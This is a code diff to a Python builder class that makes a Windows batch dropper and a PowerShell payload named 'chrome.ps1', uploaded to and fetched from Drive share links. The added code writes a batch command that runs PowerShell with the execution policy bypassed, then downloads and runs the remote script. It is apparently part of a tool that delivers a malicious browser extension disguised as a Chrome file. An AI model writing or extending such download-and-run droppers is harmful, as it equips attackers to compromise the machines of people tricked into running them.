@@ -2,6 +2,7 @@
 import os
 from colors import Colors
 from drive import Drive
+import shutil
 
 class Build :
 
@@ -9,7 +10,6 @@ class Build :
 		self.extension = extension
 		self.filetype = filetype
 		self.token = token
-		self.zipfile = Drive(self.extension, self.token).get()
 		self.color = Colors()
 
 	def builder(self) :
@@ -27,36 +27,59 @@ class Build :
 			build = "{}.{}".format(self.extension, self.filetype) # Make .bat file
 			powershell = "{}.{}".format("chrome", "ps1") # Make .bat file
 
-			if os.path.exists("output/builds/{}".format(build)):
-				print("{} File has been created{}".format(self.color.yellows("[!]"), self.extension))
+			if not os.path.exists("output/builds/{}".format(build)):
+				print("{} First upload the files to get shared links".format(self.color.yellows("[!]")))
+				with open(payloads, 'r') as f :
 
-			with open(payloads, 'r') as f :
+					# Set the drop URL or do not
+					payload = f.read()
+					payload = payload.replace('******', "******")
 
-				# Set the drop URL or do not
-				payload = f.read()
+					if self.filetype == "bat":
 
-				payload = payload.replace('******', self.zipfile[0])
-
-				print(self.zipfile[0], self.zipfile[1])
-
-				if self.filetype == "bat":
-
-					with open(os.path.join(path, powershell), 'wb') as pwsh :
-					# Write the new file
-						pwsh.write(payload)
-					pwsh.close()
-
-					with open(os.path.join(path, build), 'w') as builder :
+						with open(os.path.join(path, powershell), 'a') as pwsh :
 						# Write the new file
-						batch = "@ECHO OFF PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command (new-object net.webclient).DownloadFile('******','chrome.ps1'); ./chrome.ps1 PAUSE"
-						batch = batch.replace('******', self.zipfile[1])
-						builder.write(batch)
-					builder.close()
+							pwsh.write(payload)
+						pwsh.close()
 
-				print("{} Execuable file in directory output/extension/{}".format(self.color.status("[+]"), self.extension))
+						with open(os.path.join(path, build), 'a') as builder :
+							# Write the new file
+							batch = "@ECHO OFF PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command (new-object net.webclient).DownloadFile('******','chrome.ps1'); ./chrome.ps1 PAUSE"
+							batch = batch.replace('******', "******")
+							builder.write(batch)
+						builder.close()
+				f.close()
+			else:
 
-			f.close()
+				
+				if os.path.exists("output/builds/%s" % build) :
+					os.remove("output/builds/%s" % build)
+					os.remove("output/builds/%s" % powershell)
 
+				paths = Drive(self.extension, self.filetype, self.token).reUploadWithShareLinks()
+
+				# print(paths)
+
+				with open(payloads, 'r') as f :
+
+					# Set the drop URL or do not
+					payload = f.read()
+					payload = payload.replace('******', paths[0])
+
+					if self.filetype == "bat":
+
+						with open(os.path.join(path, powershell), 'w') as pwsh :
+						# Write the new file
+							pwsh.write(payload)
+						pwsh.close()
+
+						with open(os.path.join(path, build), 'w') as builder :
+							# Write the new file
+							batch = "@ECHO OFF PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command (new-object net.webclient).DownloadFile('******','chrome.ps1'); ./chrome.ps1 PAUSE"
+							batch = batch.replace('******', paths[1])
+							builder.write(batch)
+						builder.close()
+				f.close()
 		except IOError as e:
 			raise e
 
